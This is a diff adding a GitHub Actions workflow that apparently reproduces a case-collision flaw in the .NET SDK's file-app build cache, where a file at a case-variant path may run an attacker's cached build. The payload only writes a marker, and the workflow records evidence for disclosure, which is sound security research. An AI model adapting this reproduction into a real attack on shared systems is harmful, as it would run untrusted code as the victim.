@@ -1,0 +1,169 @@
+name: SDK file-app cache case-collision evidence
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/sdk-fileapp-cache-case-collision.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  linux-case-collision:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 11.0.100-rc.1.26425.128
+
+      - name: Show environment
+        shell: bash
+        run: |
+          set -euxo pipefail
+          dotnet --info
+          printf 'HOME=%s\n' "$HOME"
+          python3 --version
+
+      - name: Run case-sensitive cache collision experiment
+        shell: bash
+        run: |
+          set -euxo pipefail
+
+          ROOT="$RUNNER_TEMP/sdk-fileapp-case-collision"
+          LOWER_DIR="$ROOT/victim"
+          UPPER_DIR="$ROOT/VICTIM"
+          LOWER="$LOWER_DIR/Program.cs"
+          UPPER="$UPPER_DIR/Program.cs"
+          MARKER="$RUNNER_TEMP/SDK_FILEAPP_ATTACKER_EXECUTED.marker"
+
+          rm -rf "$ROOT"
+          rm -f "$MARKER"
+          mkdir -p "$LOWER_DIR" "$UPPER_DIR"
+
+          cat > "$LOWER" <<EOF
+          using System;
+          using System.IO;
+          File.WriteAllText(@"$MARKER", "ATTACKER");
+          Console.WriteLine("ATTACKER_PAYLOAD_EXECUTED");
+          EOF
+
+          cat > "$UPPER" <<'EOF'
+          using System;
+          Console.WriteLine("TRUSTED_VICTIM_EXECUTED");
+          EOF
+
+          # Make both sources older than any cache file created by the first build.
+          touch -d '2020-01-01T00:00:00Z' "$LOWER" "$UPPER"
+
+          echo "LOWER=$LOWER"
+          echo "UPPER=$UPPER"
+          stat "$LOWER" "$UPPER"
+
+          python3 - "$LOWER" "$UPPER" <<'PY'
+          import hashlib, os, sys
+          for p in sys.argv[1:]:
+              h = hashlib.sha256(p.upper().encode("utf-8")).hexdigest()
+              print(f"{p} -> {h}")
+          print("upper strings equal:", sys.argv[1].upper() == sys.argv[2].upper())
+          PY
+
+          echo "=== First run: attacker-controlled case variant ==="
+          set +e
+          dotnet run --file "$LOWER" > "$ROOT/first.stdout" 2> "$ROOT/first.stderr"
+          FIRST_RC=$?
+          set -e
+          cat "$ROOT/first.stdout"
+          cat "$ROOT/first.stderr"
+          echo "FIRST_RC=$FIRST_RC"
+          test "$FIRST_RC" -eq 0
+          grep -q 'ATTACKER_PAYLOAD_EXECUTED' "$ROOT/first.stdout"
+          test -f "$MARKER"
+
+          echo "=== Cache after first run ==="
+          find "$HOME/.local/share/dotnet/runfile" -maxdepth 3 -type f -printf '%p %TY-%Tm-%TdT%TH:%TM:%TS\n' 2>/dev/null | sort || true
+          find "$HOME/.local/share/dotnet/runfile" -maxdepth 3 -type f -name 'build-success.cache' -print -exec cat {} \; 2>/dev/null || true
+
+          rm -f "$MARKER"
+
+          echo "=== Second run: distinct trusted file whose path differs only by directory casing ==="
+          set +e
+          dotnet run --file "$UPPER" > "$ROOT/second.stdout" 2> "$ROOT/second.stderr"
+          SECOND_RC=$?
+          set -e
+          cat "$ROOT/second.stdout"
+          cat "$ROOT/second.stderr"
+          echo "SECOND_RC=$SECOND_RC"
+          test "$SECOND_RC" -eq 0
+
+          if grep -q 'ATTACKER_PAYLOAD_EXECUTED' "$ROOT/second.stdout"; then
+            echo 'CASE_COLLISION_RESULT=ATTACKER_CACHE_EXECUTED'
+          elif grep -q 'TRUSTED_VICTIM_EXECUTED' "$ROOT/second.stdout"; then
+            echo 'CASE_COLLISION_RESULT=VICTIM_REBUILT'
+          else
+            echo 'CASE_COLLISION_RESULT=UNKNOWN'
+          fi
+
+          if test -f "$MARKER"; then
+            echo 'ATTACKER_MARKER_RECREATED=true'
+          else
+            echo 'ATTACKER_MARKER_RECREATED=false'
+          fi
+
+          echo "=== Causal control: make victim source newer than cache ==="
+          sleep 2
+          touch "$UPPER"
+          rm -f "$MARKER"
+
+          set +e
+          dotnet run --file "$UPPER" > "$ROOT/control.stdout" 2> "$ROOT/control.stderr"
+          CONTROL_RC=$?
+          set -e
+          cat "$ROOT/control.stdout"
+          cat "$ROOT/control.stderr"
+          echo "CONTROL_RC=$CONTROL_RC"
+          test "$CONTROL_RC" -eq 0
+
+          if grep -q 'TRUSTED_VICTIM_EXECUTED' "$ROOT/control.stdout"; then
+            echo 'NEWER_SOURCE_CONTROL=VICTIM_REBUILT'
+          else
+            echo 'NEWER_SOURCE_CONTROL=UNEXPECTED'
+          fi
+
+          {
+            echo "=== FIRST ==="
+            cat "$ROOT/first.stdout" "$ROOT/first.stderr"
+            echo "=== SECOND ==="
+            cat "$ROOT/second.stdout" "$ROOT/second.stderr"
+            echo "=== CONTROL ==="
+            cat "$ROOT/control.stdout" "$ROOT/control.stderr"
+            echo "=== MARKER AFTER CONTROL ==="
+            test -f "$MARKER" && echo present || echo absent
+          } > "$ROOT/summary.txt"
+
+          cp "$ROOT/first.stdout" "$GITHUB_WORKSPACE/sdk-cache-first.stdout"
+          cp "$ROOT/first.stderr" "$GITHUB_WORKSPACE/sdk-cache-first.stderr"
+          cp "$ROOT/second.stdout" "$GITHUB_WORKSPACE/sdk-cache-second.stdout"
+          cp "$ROOT/second.stderr" "$GITHUB_WORKSPACE/sdk-cache-second.stderr"
+          cp "$ROOT/control.stdout" "$GITHUB_WORKSPACE/sdk-cache-control.stdout"
+          cp "$ROOT/control.stderr" "$GITHUB_WORKSPACE/sdk-cache-control.stderr"
+          cp "$ROOT/summary.txt" "$GITHUB_WORKSPACE/sdk-cache-summary.txt"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sdk-fileapp-case-collision-ubuntu
+          path: |
+            sdk-cache-first.stdout
+            sdk-cache-first.stderr
+            sdk-cache-second.stdout
+            sdk-cache-second.stderr
+            sdk-cache-control.stdout
+            sdk-cache-control.stderr
+            sdk-cache-summary.txt
